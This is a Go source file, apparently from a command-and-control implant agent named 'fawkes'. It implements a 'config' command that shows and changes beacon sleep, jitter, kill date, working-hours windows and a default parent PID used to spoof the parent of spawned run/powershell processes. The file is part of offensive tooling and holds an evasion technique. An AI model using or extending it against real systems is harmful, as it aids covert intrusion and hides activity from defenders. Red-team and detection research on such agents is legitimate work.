package commands

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// ConfigCommand implements the config command for viewing and modifying agent settings.
type ConfigCommand struct{}

func (c *ConfigCommand) Name() string        { return "config" }
func (c *ConfigCommand) Description() string { return "View or modify runtime agent configuration" }

// ConfigParams holds the parsed parameters.
type ConfigParams struct {
	Action string `json:"action"` // "show" or "set"
	Key    string `json:"key"`    // config key (for set)
	Value  string `json:"value"`  // new value (for set)
}

// ExecuteWithAgent implements AgentCommand for access to the Agent struct.
func (c *ConfigCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	var params ConfigParams
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	params.Action = strings.ToLower(params.Action)
	if params.Action == "" {
		params.Action = "show"
	}

	switch params.Action {
	case "show":
		return configShow(agent)
	case "set":
		return configSet(agent, params.Key, params.Value)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action '%s'. Use 'show' or 'set'.", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// Execute implements Command (fallback — should not be called since we use AgentCommand).
func (c *ConfigCommand) Execute(task structs.Task) structs.CommandResult {
	return structs.CommandResult{
		Output:    "Error: config command requires agent context",
		Status:    "error",
		Completed: true,
	}
}

func configShow(agent *structs.Agent) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Agent Configuration\n")
	sb.WriteString("===================\n\n")

	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Payload UUID:", agent.PayloadUUID))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Host:", agent.Host))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "User:", agent.User))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "OS:", agent.OS))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Architecture:", agent.Architecture))
	sb.WriteString(fmt.Sprintf("  %-22s %d\n", "PID:", agent.PID))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Process Name:", agent.ProcessName))
	sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Internal IP:", agent.InternalIP))
	sb.WriteString(fmt.Sprintf("  %-22s %d\n", "Integrity Level:", agent.Integrity))
	sb.WriteString("\n")

	sb.WriteString("Timing\n")
	sb.WriteString("------\n")
	sb.WriteString(fmt.Sprintf("  %-22s %ds\n", "Sleep Interval:", agent.SleepInterval))
	sb.WriteString(fmt.Sprintf("  %-22s %d%%\n", "Jitter:", agent.Jitter))

	if agent.KillDate > 0 {
		t := time.Unix(agent.KillDate, 0)
		sb.WriteString(fmt.Sprintf("  %-22s %s (unix: %d)\n", "Kill Date:", t.Format("2006-01-02 15:04:05"), agent.KillDate))
	} else {
		sb.WriteString(fmt.Sprintf("  %-22s disabled\n", "Kill Date:"))
	}
	sb.WriteString("\n")

	sb.WriteString("Working Hours\n")
	sb.WriteString("-------------\n")
	sb.WriteString("Opsec\n")
	sb.WriteString("-----\n")
	if agent.DefaultPPID > 0 {
		sb.WriteString(fmt.Sprintf("  %-22s %d\n", "Default PPID:", agent.DefaultPPID))
	} else {
		sb.WriteString(fmt.Sprintf("  %-22s disabled\n", "Default PPID:"))
	}
	sb.WriteString("\n")

	if agent.WorkingHoursEnabled() {
		sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Start:", structs.FormatWorkingHoursTime(agent.WorkingHoursStart)))
		sb.WriteString(fmt.Sprintf("  %-22s %s\n", "End:", structs.FormatWorkingHoursTime(agent.WorkingHoursEnd)))
		if len(agent.WorkingDays) > 0 {
			dayNames := []string{"", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"}
			var days []string
			for _, d := range agent.WorkingDays {
				if d >= 1 && d <= 7 {
					days = append(days, dayNames[d])
				}
			}
			sb.WriteString(fmt.Sprintf("  %-22s %s\n", "Active Days:", strings.Join(days, ", ")))
		} else {
			sb.WriteString(fmt.Sprintf("  %-22s all days\n", "Active Days:"))
		}
		if agent.IsWithinWorkingHours(time.Now()) {
			sb.WriteString(fmt.Sprintf("  %-22s ACTIVE\n", "Status:"))
		} else {
			wait := agent.MinutesUntilWorkingHours(time.Now())
			sb.WriteString(fmt.Sprintf("  %-22s INACTIVE (next window in %dh%dm)\n", "Status:", wait/60, wait%60))
		}
	} else {
		sb.WriteString("  Always active (no restrictions)\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func configSet(agent *structs.Agent, key, value string) structs.CommandResult {
	key = strings.ToLower(strings.TrimSpace(key))
	value = strings.TrimSpace(value)

	if key == "" {
		return structs.CommandResult{
			Output:    "Error: key is required. Settable keys: sleep, jitter, killdate, working_hours_start, working_hours_end, working_days, default_ppid",
			Status:    "error",
			Completed: true,
		}
	}

	switch key {
	case "sleep":
		n, err := strconv.Atoi(value)
		if err != nil || n < 0 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: invalid sleep value '%s' (must be non-negative integer seconds)", value),
				Status:    "error",
				Completed: true,
			}
		}
		old := agent.SleepInterval
		agent.SleepInterval = n
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Sleep interval changed: %ds → %ds", old, n),
			Status:    "success",
			Completed: true,
		}

	case "jitter":
		n, err := strconv.Atoi(value)
		if err != nil || n < 0 || n > 100 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: invalid jitter value '%s' (must be 0-100)", value),
				Status:    "error",
				Completed: true,
			}
		}
		old := agent.Jitter
		agent.Jitter = n
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Jitter changed: %d%% → %d%%", old, n),
			Status:    "success",
			Completed: true,
		}

	case "killdate":
		if value == "0" || value == "disable" || value == "off" || value == "" {
			agent.KillDate = 0
			return structs.CommandResult{
				Output:    "[+] Kill date disabled",
				Status:    "success",
				Completed: true,
			}
		}
		// Try unix timestamp first
		if ts, err := strconv.ParseInt(value, 10, 64); err == nil && ts > 0 {
			agent.KillDate = ts
			t := time.Unix(ts, 0)
			return structs.CommandResult{
				Output:    fmt.Sprintf("[+] Kill date set: %s (unix: %d)", t.Format("2006-01-02 15:04:05"), ts),
				Status:    "success",
				Completed: true,
			}
		}
		// Try date format
		for _, layout := range []string{"2006-01-02", "2006-01-02 15:04:05", "01/02/2006"} {
			if t, err := time.ParseInLocation(layout, value, time.Local); err == nil {
				agent.KillDate = t.Unix()
				return structs.CommandResult{
					Output:    fmt.Sprintf("[+] Kill date set: %s (unix: %d)", t.Format("2006-01-02 15:04:05"), agent.KillDate),
					Status:    "success",
					Completed: true,
				}
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: invalid killdate '%s'. Use unix timestamp, YYYY-MM-DD, or 'disable'.", value),
			Status:    "error",
			Completed: true,
		}

	case "working_hours_start", "wh_start":
		if value == "" || value == "disable" || value == "off" {
			agent.WorkingHoursStart = 0
			return structs.CommandResult{
				Output:    "[+] Working hours start cleared",
				Status:    "success",
				Completed: true,
			}
		}
		minutes, err := structs.ParseWorkingHoursTime(value)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		old := structs.FormatWorkingHoursTime(agent.WorkingHoursStart)
		agent.WorkingHoursStart = minutes
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Working hours start changed: %s → %s", old, value),
			Status:    "success",
			Completed: true,
		}

	case "working_hours_end", "wh_end":
		if value == "" || value == "disable" || value == "off" {
			agent.WorkingHoursEnd = 0
			return structs.CommandResult{
				Output:    "[+] Working hours end cleared",
				Status:    "success",
				Completed: true,
			}
		}
		minutes, err := structs.ParseWorkingHoursTime(value)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		old := structs.FormatWorkingHoursTime(agent.WorkingHoursEnd)
		agent.WorkingHoursEnd = minutes
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Working hours end changed: %s → %s", old, value),
			Status:    "success",
			Completed: true,
		}

	case "working_days", "wh_days":
		if value == "" || value == "disable" || value == "off" || value == "all" {
			agent.WorkingDays = nil
			return structs.CommandResult{
				Output:    "[+] Working days restriction cleared (active all days)",
				Status:    "success",
				Completed: true,
			}
		}
		days, err := structs.ParseWorkingDays(value)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		agent.WorkingDays = days
		dayNames := []string{"", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"}
		var names []string
		for _, d := range days {
			if d >= 1 && d <= 7 {
				names = append(names, dayNames[d])
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Working days set: %s", strings.Join(names, ", ")),
			Status:    "success",
			Completed: true,
		}

	case "default_ppid", "ppid":
		if value == "" || value == "0" || value == "disable" || value == "off" {
			old := agent.DefaultPPID
			agent.DefaultPPID = 0
			SetDefaultPPID(0)
			if old > 0 {
				return structs.CommandResult{
					Output:    fmt.Sprintf("[+] Default PPID disabled (was %d)", old),
					Status:    "success",
					Completed: true,
				}
			}
			return structs.CommandResult{
				Output:    "[+] Default PPID disabled",
				Status:    "success",
				Completed: true,
			}
		}
		n, err := strconv.Atoi(value)
		if err != nil || n < 0 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: invalid PPID value '%s' (must be non-negative integer)", value),
				Status:    "error",
				Completed: true,
			}
		}
		old := agent.DefaultPPID
		agent.DefaultPPID = n
		SetDefaultPPID(n)
		if old > 0 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("[+] Default PPID changed: %d → %d (run/powershell child processes will appear under PID %d)", old, n, n),
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("[+] Default PPID set: %d (run/powershell child processes will appear under PID %d)", n, n),
			Status:    "success",
			Completed: true,
		}

	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown config key '%s'. Settable keys: sleep, jitter, killdate, working_hours_start (wh_start), working_hours_end (wh_end), working_days (wh_days), default_ppid (ppid)", key),
			Status:    "error",
			Completed: true,
		}
	}
}
